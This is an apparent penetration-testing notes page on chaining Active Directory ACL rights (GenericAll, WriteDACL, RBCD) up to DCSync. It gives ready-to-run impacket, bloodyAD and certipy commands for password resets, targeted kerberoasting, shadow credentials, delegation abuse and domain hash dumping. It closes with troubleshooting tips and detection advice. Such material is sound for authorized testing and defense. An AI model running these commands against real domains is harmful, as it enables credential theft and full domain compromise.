---
title: AD ACL chains — from GenericAll to DCSync
tags: [windows, active-directory, acl, genericall, rbcd, kerberoasting, dcsync]
---

# AD ACLs: the chain, not the jump

**English** | [🇪🇸 Español](ad-acl-chains.md)

## 1. Read the ACLs before touching anything

```bash
bloodhound-python -u <USER> -p '<PASSWORD>' -d <DOMAIN> -ns <DC_IP> -c All
dacledit.py -action read -target '<TARGET>' -principal '<USER>' <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip <DC_IP>
bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --host <DC_IP> get object '<TARGET>'
```

BloodHound answers the right question: **what is the shortest path from my principal to Tier 0**. Each ACE has a different effect depending on object type.

| ACE | On a user | On a computer |
|---|---|---|
| `GenericAll` | password reset, SPN, shadow credentials | RBCD, LAPS, every attribute |
| `GenericWrite` | SPN (targeted kerberoast), shadow credentials | RBCD |
| `ForceChangePassword` | reset without knowing the current one | — |
| `WriteDACL` | grant yourself `GenericAll` or `DCSync` | same |
| `WriteOwner` | take ownership → `WriteDACL` | same |

## 2. GenericAll over a user

Three paths, from quietest to noisiest:

```bash
# 1) direct reset
net rpc password '<TARGET>' '<NEW_PASSWORD>' -U '<DOMAIN>/<USER>%<PASSWORD>' -S <DC_IP>

# 2) set an SPN and kerberoast (targeted)
bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --host <DC_IP> set object '<TARGET>' servicePrincipalName -v 'fake/spn.<DOMAIN>'
impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> -request -outputfile roast.txt

# 3) shadow credentials
certipy shadow add -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> -target '<TARGET>'
```

Targeted kerberoasting only works if the account has an SPN: the attacker sets it with `GenericWrite`/`GenericAll`. The TGS comes back in RC4 (`etype 23`) and cracks with `hashcat -m 13100`.

## 3. GenericAll over a computer → RBCD

`msDS-AllowedToActOnBehalfOfOtherIdentity` defines who may delegate **to** that computer. Writing it enables S4U2Self + S4U2Proxy to any service on the host, including `cifs` as Administrator.

```bash
# a controlled machine account (needs machine quota or creation rights)
impacket-addcomputer '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> \
  -computer-name 'FAKE$' -computer-pass '<MACHINE_PASSWORD>'

# write the attribute on the target
impacket-rbcd -delegate-from 'FAKE$' -delegate-to '<TARGET>$' -action write \
  '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>

# request the service as Administrator
impacket-getST -spn 'cifs/<TARGET>.<DOMAIN>' -impersonate Administrator \
  '<DOMAIN>/FAKE$:<MACHINE_PASSWORD>' -dc-ip <DC_IP>
```

With the `.ccache`: `KRB5CCNAME=Administrator.ccache` and `impacket-secretsdump -k -no-pass <TARGET>`.

## 4. From write to DCSync

`DCSync` is not a special privilege: it means holding `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` on the domain object. `WriteDACL` on the domain lets you grant them:

```bash
dacledit.py -action write -rights DCSync -principal '<USER>' -target-dn 'DC=<DOMAIN>,DC=<TLD>' \
  '<DOMAIN>/<USER>:'<PASSWORD>' -dc-ip <DC_IP>
impacket-secretsdump -just-dc '<DOMAIN>/<USER>:<PASSWORD>@<DC_FQDN>'
```

## 5. Typical errors

- **`Could not find the base DN`** → use `-target-dn` with the full DN, or `-target '<DOMAIN>'` with dacledit's syntax.
- **RBCD write fails** → missing `GenericWrite`/`GenericAll` on the computer, or the object is a DC (RBCD against a DC needs extra rights).
- **`getST` returns `KDC_ERR_BADOPTION`** → the SPN does not exist on the target or the attribute has not replicated; wait a moment or use another service (`http`, `host`).
- **The hash will not crack** → the account is AES-only; use `-m 19700` or request the ticket with `-aes`.
- **The reset breaks access** → you changed the password of an account in use; document it and restore.

## 6. Detection and mitigation

- Audit dangerous ACEs on Tier 0 objects and on OUs with inheritance; review `AdminSDHolder` and `Domain Admins`.
- Alert on 4662 against the domain with `DS-Replication-Get-Changes-All`, on 4720/4738 and on 4769 with RC4 for user accounts.
- Cap machine account creation (`ms-DS-MachineAccountQuota`) at 0 unless required.
- Review `msDS-AllowedToActOnBehalfOfOtherIdentity` on every computer and clear it where it does not belong.

MITRE: T1098, T1134.001, T1558.003, T1003.006.
